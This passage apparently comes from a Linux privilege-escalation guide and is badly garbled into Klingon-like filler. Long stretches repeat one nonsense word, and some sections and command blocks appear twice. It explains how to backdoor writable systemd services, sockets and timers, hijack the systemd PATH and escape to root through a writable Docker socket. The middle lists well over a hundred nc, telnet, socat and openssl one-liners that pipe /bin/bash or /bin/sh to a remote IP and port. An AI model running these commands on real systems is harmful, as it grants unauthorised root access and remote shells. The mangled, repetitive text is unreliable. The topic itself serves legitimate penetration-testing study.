vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu'wI'vam vItlhutlhpu
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**ghItlhvam** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (qaStaHvIS 'ej list every process that starts).

### qIb cron jobs

**qay'** **carriage return** **comment** **putting a** cronjob **possible** (newline character without), **cron job** **work**. **Example** (carriage return char **note**):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted).\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Keep in mind that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:

```
systemctl show-environment
```

If you can modify the PATH, you can create a malicious binary with the same name as a trusted binary and place it in a directory that appears earlier in the PATH. This way, when the service is executed, it will run your malicious binary instead of the trusted one.
```bash
systemctl show-environment
```
ghItlhvam **write** vItlhutlh **folders** path vItlhutlh **escalate privileges**. **relative paths being used on service configurations** files **search** vItlhutlh **need**. **like**:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
**ghItlh**. **executable** **lu'** **relative path binary** **name** **ghItlh** **systemd PATH folder** **create** **'ej** **vulnerable action** (**Start**, **Stop**, **Reload**) **service** **execute** **backdoor** **(unprivileged users usually cannot start/stop services but check if you can use `sudo -l`)**.

**'ej** **services** **'oH** **`man systemd.service`** **'oH** **ghItlh**.

## **Timers**

**Timers** **systemd unit files** **name** **ends** **`**.timer**`** **control** **`**.service**`** **files** **events**. **Timers** **cron** **alternative** **used** **can** **built-in support** **calendar time events** **monotonic time events** **run** **asynchronously**.

**enumerate** **timers** **can** **with**:
```bash
systemctl list-timers --all
```
### QaDmeyDaq QaDmey

vaj timers vItlhutlh. vaj vItlhutlh 'ej vItlhutlh systemd.unit (vaj `.service` pe'vIl vaj `.target`) vItlhutlh vItlhutlh.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

Therefore, to abuse this permission you would need to:

* Find some systemd unit (like a `.service`) that is **executing a writable binary**
* Find some systemd unit that is **executing a relative path** and you have **writable privileges** over the **systemd PATH** (to impersonate that executable)

**Learn more about timers with `man systemd.timer`.**

### **Enabling Timer**

To enable a timer you need root privileges and to execute:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**ghItlh** **timer** **activated** **creating** symlink **/etc/systemd/system/<WantedBy_section>.wants/<name>.timer**

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF\_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
* `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
* `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
* `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### raw qonwI' 

```
nc -nv <IP> <port>
```

```
telnet <IP> <port>
```

```
ncat -nv <IP> <port>
```

```
socat - TCP:<IP>:<port>
```

```
openssl s_client -connect <IP>:<port>
```

```
rlwrap nc -nv <IP> <port>
```

```
rlwrap telnet <IP> <port>
```

```
rlwrap ncat -nv <IP> <port>
```

```
rlwrap socat - TCP:<IP>:<port>
```

```
rlwrap openssl s_client -connect <IP>:<port>
```

```
stty raw -echo; (stty size; cat) | nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | openssl s_server -quiet -accept <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap openssl s_server -quiet -accept <port> ; stty sane
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
/bin/sh -i
```

```
perl -e 'exec "/bin/sh";'
```

```
perl -e 'exec "/bin/bash";'
```

```
ruby -e 'exec "/bin/sh"'
```

```
ruby -e 'exec "/bin/bash"'
```

```
lua -e 'os.execute("/bin/sh")'
```

```
lua -e 'os.execute("/bin/bash")'
```

```
telnet <IP> <port> | /bin/bash | telnet <IP> <port>
```

```
telnet <IP> <port> | /bin/sh | telnet <IP> <port>
```

```
nc -nv <IP> <port> | /bin/bash | nc -nv <IP> <port>
```

```
nc -nv <IP> <port> | /bin/sh | nc -nv <IP> <port>
```

```
ncat -nv <IP> <port> | /bin/bash | ncat -nv <IP> <port>
```

```
ncat -nv <IP> <port> | /bin/sh | ncat -nv <IP> <port>
```

```
socat - TCP:<IP>:<port> | /bin/bash | socat - TCP:<IP>:<port>
```

```
socat - TCP:<IP>:<port> | /bin/sh | socat - TCP:<IP>:<port>
```

```
openssl s_client -connect <IP>:<port> | /bin/bash | openssl s_client -connect <IP>:<port>
```

```
openssl s_client -connect <IP>:<port> | /bin/sh | openssl s_client -connect <IP>:<port>
```

```
rlwrap nc -nv <IP> <port> | /bin/bash | rlwrap nc -nv <IP> <port>
```

```
rlwrap nc -nv <IP> <port> | /bin/sh | rlwrap nc -nv <IP> <port>
```

```
rlwrap telnet <IP> <port> | /bin/bash | rlwrap telnet <IP> <port>
```

```
rlwrap telnet <IP> <port> | /bin/sh | rlwrap telnet <IP> <port>
```

```
rlwrap ncat -nv <IP> <port> | /bin/bash | rlwrap ncat -nv <IP> <port>
```

```
rlwrap ncat -nv <IP> <port> | /bin/sh | rlwrap ncat -nv <IP> <port>
```

```
rlwrap socat - TCP:<IP>:<port> | /bin/bash | rlwrap socat - TCP:<IP>:<port>
```

```
rlwrap socat - TCP:<IP>:<port> | /bin/sh | rlwrap socat - TCP:<IP>:<port>
```

```
rlwrap openssl s_client -connect <IP>:<port> | /bin/bash | rlwrap openssl s_client -connect <IP>:<port>
```

```
rlwrap openssl s_client -connect <IP>:<port> | /bin/sh | rlwrap openssl s_client -connect <IP>:<port>
```

```
stty raw -echo; (stty size; cat) | nc -lvnp <port> | /bin/bash | nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | nc -lvnp <port> | /bin/sh | nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | telnet -l <username> -p <port> <IP> | /bin/bash | telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | telnet -l <username> -p <port> <IP> | /bin/sh | telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | ncat -lvnp <port> | /bin/bash | ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | ncat -lvnp <port> | /bin/sh | ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | socat - TCP4:<IP>:<port> | /bin/bash | socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | socat - TCP4:<IP>:<port> | /bin/sh | socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | openssl s_server -quiet -accept <port> | /bin/bash | openssl s_server -quiet -accept <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | openssl s_server -quiet -accept <port> | /bin/sh | openssl s_server -quiet -accept <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp <port> | /bin/bash | rlwrap nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp <port> | /bin/sh | rlwrap nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap telnet -l <username> -p <port> <IP> | /bin/bash | rlwrap telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap telnet -l <username> -p <port> <IP> | /bin/sh | rlwrap telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap ncat -lvnp <port> | /bin/bash | rlwrap ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap ncat -lvnp <port> | /bin/sh | rlwrap ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap socat - TCP4:<IP>:<port> | /bin/bash | rlwrap socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap socat - TCP4:<IP>:<port> | /bin/sh | rlwrap socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap openssl s_client -connect <IP>:<port> | /bin/bash | rlwrap openssl s_client -connect <IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap openssl s_client -connect <IP>:<port> | /bin/sh | rlwrap openssl s_client -connect <IP>:<port> ; stty sane
```

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```
/bin/sh -i
```

```
perl -e 'exec "/bin/sh";'
```

```
perl -e 'exec "/bin/bash";'
```

```
ruby -e 'exec "/bin/sh"'
```

```
ruby -e 'exec "/bin/bash"'
```

```
lua -e 'os.execute("/bin/sh")'
```

```
lua -e 'os.execute("/bin/bash")'
```

```
telnet <IP> <port> | /bin/bash | telnet <IP> <port>
```

```
telnet <IP> <port> | /bin/sh | telnet <IP> <port>
```

```
nc -nv <IP> <port> | /bin/bash | nc -nv <IP> <port>
```

```
nc -nv <IP> <port> | /bin/sh | nc -nv <IP> <port>
```

```
ncat -nv <IP> <port> | /bin/bash | ncat -nv <IP> <port>
```

```
ncat -nv <IP> <port> | /bin/sh | ncat -nv <IP> <port>
```

```
socat - TCP:<IP>:<port> | /bin/bash | socat - TCP:<IP>:<port>
```

```
socat - TCP:<IP>:<port> | /bin/sh | socat - TCP:<IP>:<port>
```

```
openssl s_client -connect <IP>:<port> | /bin/bash | openssl s_client -connect <IP>:<port>
```

```
openssl s_client -connect <IP>:<port> | /bin/sh | openssl s_client -connect <IP>:<port>
```

```
rlwrap nc -nv <IP> <port> | /bin/bash | rlwrap nc -nv <IP> <port>
```

```
rlwrap nc -nv <IP> <port> | /bin/sh | rlwrap nc -nv <IP> <port>
```

```
rlwrap telnet <IP> <port> | /bin/bash | rlwrap telnet <IP> <port>
```

```
rlwrap telnet <IP> <port> | /bin/sh | rlwrap telnet <IP> <port>
```

```
rlwrap ncat -nv <IP> <port> | /bin/bash | rlwrap ncat -nv <IP> <port>
```

```
rlwrap ncat -nv <IP> <port> | /bin/sh | rlwrap ncat -nv <IP> <port>
```

```
rlwrap socat - TCP:<IP>:<port> | /bin/bash | rlwrap socat - TCP:<IP>:<port>
```

```
rlwrap socat - TCP:<IP>:<port> | /bin/sh | rlwrap socat - TCP:<IP>:<port>
```

```
rlwrap openssl s_client -connect <IP>:<port> | /bin/bash | rlwrap openssl s_client -connect <IP>:<port>
```

```
rlwrap openssl s_client -connect <IP>:<port> | /bin/sh | rlwrap openssl s_client -connect <IP>:<port>
```

```
stty raw -echo; (stty size; cat) | nc -lvnp <port> | /bin/bash | nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | nc -lvnp <port> | /bin/sh | nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | telnet -l <username> -p <port> <IP> | /bin/bash | telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | telnet -l <username> -p <port> <IP> | /bin/sh | telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | ncat -lvnp <port> | /bin/bash | ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | ncat -lvnp <port> | /bin/sh | ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | socat - TCP4:<IP>:<port> | /bin/bash | socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | socat - TCP4:<IP>:<port> | /bin/sh | socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | openssl s_server -quiet -accept <port> | /bin/bash | openssl s_server -quiet -accept <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | openssl s_server -quiet -accept <port> | /bin/sh | openssl s_server -quiet -accept <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp <port> | /bin/bash | rlwrap nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap nc -lvnp <port> | /bin/sh | rlwrap nc -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap telnet -l <username> -p <port> <IP> | /bin/bash | rlwrap telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap telnet -l <username> -p <port> <IP> | /bin/sh | rlwrap telnet -l <username> -p <port> <IP> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap ncat -lvnp <port> | /bin/bash | rlwrap ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap ncat -lvnp <port> | /bin/sh | rlwrap ncat -lvnp <port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap socat - TCP4:<IP>:<port> | /bin/bash | rlwrap socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap socat - TCP4:<IP>:<port> | /bin/sh | rlwrap socat - TCP4:<IP>:<port> ; stty sane
```

```
stty raw -echo; (stty size; cat) | rlwrap openssl s_client -connect <IP>:<port> | /bin/bash | rlwrap openssl s_client -connect <IP>:<port> ;
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sockets

Note that there may be some **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). You can check this with:

**Exploitation example:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### HTTP sockets

Note that there may be some **sockets listening for HTTP** requests (_I'm not talking about .socket files but the files acting as unix sockets_). You can check this with:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
**HTTP** **tlhIngan** **responds** **socket** **'ej** **vaj** **exploit** **vulnerability** **'ej** **communicate**.

### Writable Docker Socket

**Docker socket**, **/var/run/docker.sock**, **critical file** **secured** **should**. **root** **user** **'ej** **docker** **group** **members** **writable** **default**. **socket** **write access** **possession** **privilege escalation** **lead** **can**. **Docker CLI** **available** **alternative methods** **breakdown** **Here**.

#### **Privilege Escalation with Docker CLI**

**Docker socket** **write access** **possessing**, **privilege escalation** **can** **commands** **following** **using**:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### **Docker API Directly** (Docker API Daq)

DaqDI' Docker CLI 'e' vItlhutlh. Docker API 'e' 'curl' commands lo'laHbe'lu'.

1. **Docker Images QaStaHvIS:**
Docker Images QaStaHvIS qabnIS.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Container Qap:**
Host System 'e' mount qatlh container Qap request.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Qap created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3. **Container 'e' Attach:**
Container 'e' connection 'e' 'socat' vItlhutlh, vItlhutlh container 'e' command execution vItlhutlh.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

'socat' connection vItlhutlh, root-level access vItlhutlh host's filesystem 'e' directly commands vItlhutlh container 'e' execute vItlhutlh.

### Others (bIQtIq)

Docker socket 'e' write permissions 'e' vaj 'ej **'docker'** group 'e' vItlhutlh [**privileges vItlhutlh ways**] (interesting-groups-linux-pe/#docker-group) vaj. [**Docker API port 'e' listening** vaj 'e' vItlhutlh compromise vItlhutlh] (../../network-services-pentesting/2375-pentesting-docker.md#compromising) vaj.

**Docker vaj 'ej vItlhutlh privileges vItlhutlh ways** check:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Containerd (ctr) vItlhutlh

**'ctr'** command vItlhutlh vaj **'e' vItlhutlh privileges vItlhutlh ways** 'e' abuse vItlhutlh vaj:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## **RunC** vItlhutlh

**'runc'** command vItlhutlh vaj **'e' vItlhutlh privileges vItlhutlh ways** 'e' abuse vItlhutlh vaj:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus Hoch 'e' **inter-Process Communication (IPC) system** Hoch, 'ej applications vItlhutlh interaction 'ej data share vItlhutlh. Linux system Hoch vItlhutlh, 'oH framework 'e' different forms of application communication vItlhutlh.

System Hoch, basic IPC vItlhutlh, processes vItlhutlh data exchange vItlhutlh, UNIX domain sockets vItlhutlh. 'ej, 'oH broadcasting events 'ej signals vItlhutlh, system components vItlhutlh seamless integration vItlhutlh. Example, Bluetooth daemon vItlhutlh incoming call vItlhutlh signal, music player vItlhutlh mute vItlhutlh, user experience vItlhutlh. D-Bus vItlhutlh remote object system vItlhutlh, service requests 'ej method invocations vItlhutlh applications vItlhutlh, traditionally complex processes vItlhutlh streamline vItlhutlh.

D-Bus 'e' **allow/deny model** Hoch, message permissions (method calls, signal emissions, etc.) vItlhutlh, matching policy rules vItlhutlh cumulative effect vItlhutlh. Policy 'oH bus vItlhutlh interaction vItlhutlh, privilege escalation vItlhutlh exploitation vItlhutlh permissions vItlhutlh.

Example, `/etc/dbus-1/system.d/wpa_supplicant.conf` Hoch policy, root user vItlhutlh, `fi.w1.wpa_supplicant1` vItlhutlh messages vItlhutlh, send vItlhutlh, 'ej receive vItlhutlh permissions vItlhutlh.

Policies Hoch user 'ej group vItlhutlh specified vaj, universally vItlhutlh apply, "default" context policies vItlhutlh, not covered vItlhutlh vItlhutlh apply.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**qaStaHvIS D-Bus communication enumerate 'ej je.**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Network**

**machinen position 'ejmeH interesting 'oH.**

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Qap jatlh

ghItlhvam vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh vItlhutlhlaHbe'chugh 